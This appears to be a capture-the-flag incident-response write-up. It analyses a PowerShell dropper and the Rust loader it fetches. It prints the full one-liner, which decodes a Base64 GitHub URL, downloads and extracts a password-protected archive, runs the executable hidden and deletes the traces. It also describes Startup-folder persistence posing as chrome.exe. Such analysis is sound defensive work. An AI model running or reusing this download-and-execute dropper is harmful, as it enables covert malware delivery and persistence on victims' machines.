IR 2 

Incident Response 2: Wiege
The malicious command downloaded and executed a binary. Find out what it did.

Handout is the same as the one used to solve My Clematis.


So we need to go back to the ps script 


```ps
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL2x1a2EtNGV2ci9teS1sb3ZlL3Jhdy9yZWZzL2hlYWRzL21haW4vaG1tLjd6')) | ForEach-Object { $url = $_; $dir = "$env:USERPROFILE\Downloads\hmm_temp"; New-Item -ItemType Directory -Path $dir -Force | Out-Null; $archive = "$dir\hmm.7z"; Invoke-WebRequest -Uri $url -OutFile $archive; & "7z" x "-phyuluvhyuluvhyu" -o"$dir" $archive | Out-Null; Remove-Item $archive; Start-Process -FilePath "$dir\hash_encoder.exe" -WindowStyle Hidden -Wait; Remove-Item $dir -Recurse -Force }
```


This PowerShell one-liner first **decodes a Base64-encoded string to obtain a GitHub URL**, then uses it to **download a password-protected archive**, execute its contents, and clean up all traces. The decoded string resolves to a URL hosting `hmm.7z`. The script creates a temporary directory in the user’s Downloads folder, saves the archive there, and extracts it using 7-Zip with a hardcoded password. After extraction, the archive is deleted, and the extracted executable `hash_encoder.exe` is launched with its window hidden and the script waits for it to finish executing. Once the process completes, the entire temporary directory is removed recursively, leaving minimal artifacts on the system.


The Base64 string decodes to this URL:

```
https://github.com/luka-4evr/my-love/raw/refs/heads/main/hmm.7z
```


So after extracting that we got a binary ; 

<img width="829" height="122" alt="image" src="https://github.com/user-attachments/assets/f8cec150-70d9-4648-8eb8-570c3a1e86dd" />


We'll use IDA for understanding what this exe does 


<img width="727" height="577" alt="image" src="https://github.com/user-attachments/assets/64c222c7-2db1-40d2-a159-f2b078bbb3b8" />


The decompiler identified a main 

<img width="666" height="205" alt="image" src="https://github.com/user-attachments/assets/3e761c57-5458-46ae-ab0a-d4783cffed1a" />


Also there's a TLS function which performs exception handling, stack safety, and thread-local state, then invokes the real program logic via a function pointer, and finally performs optional shutdown handling

```c
__int64 __fastcall sub_14013AA40(__int64 a1, __int64 a2)
{
  __int64 v4; // rax
  __int64 v5; // rdx
  __int64 *v6; // rcx
  signed __int64 v7; // rax
  signed __int64 v8; // rtt
  __int64 result; // rax
  __int64 v10; // rsi
  ULONG StackSizeInBytes[2]; // [rsp+30h] [rbp-50h] BYREF
  _QWORD v12[10]; // [rsp+60h] [rbp-20h] BYREF

  v12[4] = -2;
  AddVectoredExceptionHandler(0, Handler);
  StackSizeInBytes[0] = 20480;
  SetThreadStackGuarantee(StackSizeInBytes);
  GetCurrentThread();
  off_14023D130();
  v4 = *((_QWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + (unsigned int)TlsIndex);
  v5 = *(_QWORD *)(v4 + 96);
  if ( !v5 )
  {
    v6 = (__int64 *)(v4 + 96);
    v7 = qword_14023D358;
    do
    {
      if ( v7 == -1 )
        sub_140179190(v6);
      v5 = v7 + 1;
      v8 = v7;
      v7 = _InterlockedCompareExchange64(&qword_14023D358, v7 + 1, v7);
    }
    while ( v8 != v7 );
    *v6 = v5;
  }
  qword_14023D348 = v5;
  result = (*(int (__fastcall **)(__int64))(a2 + 40))(a1);
  if ( dword_14023D128 )
  {
    v10 = (int)result;
    LOBYTE(v12[0]) = 1;
    *(_QWORD *)StackSizeInBytes = v12;
    sub_1401789C0(
      (unsigned int)&dword_14023D128,
      0,
      (unsigned int)StackSizeInBytes,
      (unsigned int)&unk_14020AB78,
      (__int64)&off_1402095A8);
    return v10;
  }
  return result;
}
```
ALso checking strings there are some interesting things 

<img width="1919" height="1017" alt="image" src="https://github.com/user-attachments/assets/738b6e17-9fa9-4ee0-9243-1d596b50d1dd" />


The binary is rust compiles which makes sense why the CFG is flatlines and the start is just a  setup function 

Summarising with an assumption so far from strings data 

The presence of messages like *“Failed to base64 decode”*, *“Decoded data not UTF-8”*, and various invalid Base64 error strings indicates that the program actively processes Base64-encoded input, matching the earlier PowerShell stage that delivers encoded data. Cryptographic strings such as *“Montgomery Multiplication for x86_64”* suggest use of big-number or hashing primitives. Most critically, hardcoded URLs pointing to attacker-controlled GitHub repositories and Windows paths like the Startup folder and Defender-themed directories reveal that this executable functions as a **secondary loader**, capable of downloading additional payloads, performing network operations, and attempting persistence while masquerading as legitimate Windows components

After corss checking with strings , i came across a big function that seems to be the main logic 

<img width="1505" height="676" alt="image" src="https://github.com/user-attachments/assets/e61c21f3-8445-4871-b21c-d1db882afd40" />

TLDR - 

This function is the **core payload logic** of the malware and ties together everything seen earlier from the PowerShell dropper and strings analysis. At a high level, it **decodes embedded data, decrypts and validates it, establishes persistence, performs staged network communication, and conditionally executes follow-on actions**, all wrapped in heavy Rust runtime machinery.

In sequence, the function first initializes internal Rust structures and decodes an embedded Base64 blob, explicitly handling failure cases such as *“Failed to base64 decode”* and *“Decoded data not UTF-8”*. The decoded buffer is then **XOR-decoded using a repeating key derived from a hardcoded string (`chrome.exeETIN/...`)**, which is classic lightweight obfuscation rather than encryption. Once decoded, the data is validated and processed as UTF-8, indicating it is expected to be structured text rather than raw shellcode.

Next, the function constructs filesystem paths pointing to **`APPDATA\Microsoft\Windows\Start Menu\Programs\Startup`**, along with a cascade of Defender/Telemetry-themed directory names. This strongly indicates **persistence setup via the Startup folder**, with deliberate masquerading as legitimate Windows components. The function dynamically selects one of several benign-looking names to blend in.

After persistence preparation, the function enters a complex loop that **processes input byte-by-byte**, transforms it into chunks, and performs **network I/O** using Windows handles. It computes rolling hashes and bounds checks (using constants and bitwise math) to validate downloaded or received data, rejecting anything that does not meet strict constraints. This logic strongly resembles a **command-and-control staging mechanism**, where payload chunks are fetched, verified, and only executed if integrity checks pass.

Finally, if all checks succeed, the function **writes or executes the received payload**, cleans up allocated memory, closes handles, and returns control back up the call chain. The heavy use of reference counting, allocator calls, and cleanup paths is consistent with **Rust-compiled malware** and explains the verbosity and complexity of the decompilation.


So it's saved as chrome.exe in startup data 








